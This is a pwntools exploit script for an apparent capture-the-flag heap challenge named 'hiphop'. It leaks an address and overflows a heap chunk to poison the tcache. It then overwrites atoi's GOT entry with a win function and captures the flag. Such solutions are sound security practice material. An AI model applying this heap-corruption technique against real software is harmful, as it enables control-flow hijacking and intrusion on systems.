#!/usr/bin/env python3
from pwn import *
import re

# Context setup
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Use the loader to run the binary with the custom glibc
binary_path = './dist/hiphop'
loader_path = './dist/ld-linux-x86-64.so.2'
libc_dir = './dist'

binary = ELF(binary_path, checksec=False)

def strip_ansi(data):
    return re.sub(rb'\x1b\[[0-9;]*m', b'', data).decode('ascii')

def start():
    if args.REMOTE:
        return remote('localhost', 9008)
    else:
        # Launch binary using the loader for maximum reliability
        return process([loader_path, '--library-path', libc_dir, binary_path])

io = start()

def add():
    io.sendlineafter(b' >> ', b'1')
    return

def delete(idx):
    io.sendlineafter(b' >> ', b'2')
    io.sendlineafter(b'Idx: ', str(idx).encode())

def edit(idx, content):
    io.sendlineafter(b' >> ', b'3')
    io.sendlineafter(b'Idx: ', str(idx).encode())
    # Overflow exactly into next chunk metadata
    payload = content.ljust(0x100 + 0x20, b'\x00')
    io.sendafter(b'Lyrics: ', payload)

# 1. Leak and calculate offsets
io.recvuntil(b'[*] Console ready at \x1b[96m0x')
tracks_addr = int(io.recvuntil(b'\x1b', drop=True), 16)
log.success(f"Tracks at: {hex(tracks_addr)}")

# Symbol tracks @ 0x2030c0
binary.address = tracks_addr - 0x2030c0
log.info(f"Binary base: {hex(binary.address)}")

# 2. Tcache Poisoning
add() # 0
add() # 1

log.info("Freeing idx1 to tcache...")
delete(1)

# Overwrite idx1's next pointer with atoi@got
atoi_got = binary.got['atoi']
mic_check = binary.symbols['mic_check']
log.success(f"Targeting atoi@got: {hex(atoi_got)}")
log.success(f"mic_check: {hex(mic_check)}")

# idx0 -> data area (0x100 bytes)
payload = b'A' * 0x100
payload += p64(0)
payload += p64(0x111)
payload += p64(atoi_got)

log.info("Poisoning Tcache...")
edit(0, payload)

# 3. Allocations to reach GOT
add() # 1
add() # 2
log.success("Allocation 2 is at atoi@got!")

# 4. Overwrite atoi@got
log.info("Overwriting atoi@got...")
edit(2, p64(mic_check))

log.success("Triggering Shell (calling atoi)...")
io.sendline(b'1')

# Capture flag
flag_data = io.recvall(timeout=2)
flag = re.search(r'MOJO-JOJO\{.*?\}', flag_data.decode())
if flag:
    log.success(f"Flag captured: {flag.group(0)}")
else:
    log.info("Raw output:\n" + flag_data.decode())
    log.error("Flag not found!")

io.close()
